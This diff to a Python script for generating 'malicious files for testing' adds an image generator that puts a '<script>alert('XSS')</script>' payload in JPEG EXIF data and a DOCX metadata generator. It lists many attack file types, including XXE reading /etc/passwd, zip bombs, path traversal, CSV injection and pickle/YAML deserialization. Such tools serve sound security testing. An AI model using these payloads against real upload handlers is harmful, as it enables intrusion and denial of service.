@@ -9,6 +9,8 @@ import xlwt
 import pickle
 import tarfile
 import yaml
+import piexif
+from PIL import Image
 
 def generate_xxe_file(filename="xxe.xml", target_file="/etc/passwd"):
     """
@@ -270,10 +272,41 @@ def generate_yaml_payload(filename="payload.yaml"):
     print(f"Generated YAML payload file: {filename}")
 
 
+def generate_image_with_malicious_metadata(filename="metadata.jpg", payload="<script>alert('XSS')</script>"):
+    """
+    Generates a JPEG image with a malicious payload in its EXIF data.
+    """
+    # Create a dummy image
+    img = Image.new('RGB', (100, 100), color = 'red')
+
+    # Create malicious EXIF data
+    exif_dict = {"0th": {piexif.ImageIFD.ImageDescription: payload.encode()}}
+    exif_bytes = piexif.dump(exif_dict)
+
+    # Save the image with the malicious EXIF data
+    img.save(filename, "jpeg", exif=exif_bytes)
+    print(f"Generated image with malicious metadata: {filename}")
+
+
+def generate_doc_with_custom_metadata(filename="metadata.docx", comment="See http://example.com/resource for more info"):
+    """
+    Generates a DOCX file with custom metadata.
+    """
+    document = docx.Document()
+    core_properties = document.core_properties
+    core_properties.author = "Test User"
+    core_properties.comments = comment
+    document.add_paragraph("This is a test document with custom metadata.")
+    document.save(filename)
+    print(f"Generated DOCX with custom metadata: {filename}")
+
+
+
+
 if __name__ == "__main__":
     import argparse
     parser = argparse.ArgumentParser(description="Generate malicious files for testing.")
-    parser.add_argument("filetype", choices=["xxe", "billion_laughs", "quadratic_blowup", "zip_traversal", "zip_bomb", "gz_bomb", "svg", "double_extension", "file_in_parent", "csv_injection", "gifar", "json_deserialization", "pdf_js", "dde", "pdf_zip_polyglot", "docx", "xls", "pickle", "tar_traversal", "yaml"], help="Type of file to generate.")
+    parser.add_argument("filetype", choices=["xxe", "billion_laughs", "quadratic_blowup", "zip_traversal", "zip_bomb", "gz_bomb", "svg", "double_extension", "file_in_parent", "csv_injection", "gifar", "json_deserialization", "pdf_js", "dde", "pdf_zip_polyglot", "docx", "xls", "pickle", "tar_traversal", "yaml", "image_metadata", "pdf_hidden_text"], help="Type of file to generate.")
     args = parser.parse_args()
 
     if args.filetype == "xxe":
@@ -316,3 +349,7 @@ if __name__ == "__main__":
         generate_tar_traversal()
     elif args.filetype == "yaml":
         generate_yaml_payload()
+    elif args.filetype == "image_metadata":
+        generate_image_with_malicious_metadata()
+    elif args.filetype == "pdf_hidden_text":
+        generate_pdf_with_hidden_text()
